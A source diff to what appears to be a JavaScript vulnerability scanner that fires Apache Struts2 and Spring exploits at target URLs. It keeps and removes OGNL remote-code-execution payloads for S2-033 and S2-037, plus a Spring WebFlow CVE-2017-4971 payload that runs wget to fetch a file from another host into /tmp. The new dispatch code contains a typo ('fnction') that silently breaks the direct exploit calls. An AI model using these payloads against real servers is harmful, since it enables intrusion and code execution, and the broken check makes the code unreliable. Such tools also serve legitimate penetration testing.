@@ -224,26 +224,6 @@ function fnTest(s)
 	  );
 }
 
-function getIps(ip)
-{
-	var re = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/gmi.exec(ip);
-	if(re && 0 < re.length)ip = re[1];
-	request.get("http://ipinfo.io/" + ip,function(e,r,b)
-	{
-		try{if(!e)g_oRst["ipinfo"] = JSON.parse(b);}catch(e1){}
-	});
-
-}
-for(var k in this)
-console.log(k + " = " + this[k])
-// /usr/local/apache-tomcat-7.0.64-2/webapps
-// http://192.168.10.216:8082/s2-046/
-function doStruts2_046(url)
-{
-	runChecks(szUrl2,"struts2,046");
-}
-
-
 /*
 Spring WebFlow 远程代码执行漏洞(CVE-2017-4971)
 &_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.2.140:8000/1")
@@ -272,18 +252,6 @@ function DoSpringBoot(url)
     });
 }
 
-// s2-033,s2-037
-// s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
-function doStruts2_037(url)
-{
-	var szOldUrl = url;
-	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
-	request(fnOptHeader({method: 'POST',uri: url}),
-    	function(e,r,b)
-    {
-    	fnDoBody(b,"s2-037",szOldUrl);
-    });
-}
 // s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
 function doStruts2_033(url)
 {
@@ -1266,13 +1234,13 @@ function fnTestStruts2(szUrl2, obj)
 	{
 		a[k].call(fnGetCpy(),szUrl2);
 	}
-
-	runChecks(szUrl2,"struts2,045");
-	a = [doStruts2_005,doStruts2_008,doStruts2_015,doStruts2_016,doStruts2_019,doStruts2_032,doStruts2_033,doStruts2_037,doStruts2_DevMode,doStruts2_046];
+	a = "005,008,015,016,019,032,033,037,045,046,DevMode".split(g_szSplit);
 	if(!obj)
 	for(var k in a)
 	{
-		a[k](szUrl2);
+		if("fnction" == typeof global["doStruts2_" + a[k]])
+			global["doStruts2_" + a[k]](szUrl2);
+		else runChecks(szUrl2,"struts2," + a[k]);
 	}
 	// doStruts2_020(g_szUrl);
 	// doStruts2_052(szUrl2);
@@ -1287,7 +1255,8 @@ if(!program.test && 0 < a.length && g_szUrl)
 	{
 		if(/^\d\d\d$/g.test(program.struts2))
 		{
-			eval("doStruts2_" + program.struts2 + "(g_szUrl)");
+			// eval("doStruts2_" + program.struts2 + "(g_szUrl)");
+			runChecks(g_szUrl,"struts2," + program.struts2);
 			if(program.cmd && "string" == typeof program.cmd)
 			{
 				/*
@@ -1354,7 +1323,6 @@ if(program.test)
 	doStruts2_DevMode(g_szUrl);
 
 	// 文件上传测试
-	doStruts2_046(g_szUrl);
 	doStruts2_048(g_szUrl);
 	//*/
 	//*
@@ -1368,7 +1336,7 @@ if(program.test)
 	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
 	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
 	
-	doStruts2_046.call({name:null},"http://192.168.10.216:8082/s2-046/");
+	runChecks("http://192.168.10.216:8082/s2-046/doUpload.action","struts2,046");
 	doStruts2_048.call({name:null},"http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
 	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
 	///////////*/
